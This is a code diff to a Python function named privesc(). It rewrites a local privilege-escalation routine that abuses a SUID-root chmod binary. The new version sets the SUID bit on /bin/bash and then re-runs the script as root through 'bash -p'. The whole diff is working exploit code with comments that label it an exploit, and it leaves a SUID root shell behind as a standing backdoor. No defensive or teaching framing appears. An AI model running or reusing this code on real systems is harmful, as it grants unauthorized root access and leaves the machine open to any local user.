@@ -51,14 +51,16 @@ def privesc():
     if os.geteuid() != 0:
         print("Elevating to root using misconfigured chmod...")
         try:
-            # 1. Use the SUID chmod to set the SUID/SGID bits on THIS file
-            # Since /usr/bin/chmod is SUID root, it can change permissions on any file.
-            subprocess.run(["/usr/bin/chmod", "6777", THIS_FILE], check=True)
+            # 1. Exploit: Use misconfigured chmod to set SUID bit on /bin/bash
+            subprocess.run(["/usr/bin/chmod", "+s", "/bin/bash"], check=True)
+            print("[+] Successfully set SUID on /bin/bash")
             
-            # 2. Re-execute the script
-            # Because of the 6777 bits, the OS loader will now assign root EUID to the new process.
-            # We use os.execv to replace the current process image in memory.
-            os.execv(sys.executable, [sys.executable, THIS_FILE])
+            # 2. Restart the server as root.
+            # We use os.execv to replace the current process.
+            # We call our new SUID bash with the '-p' (privileged) flag, 
+            # and tell it to execute this exact Python script.
+            os.execv("/bin/bash", ["bash", "-p", "-c", f"{sys.executable} {THIS_FILE}"])
+            
         except Exception as e:
             print(f"Failed to elevate: {e}")
             sys.exit(1)
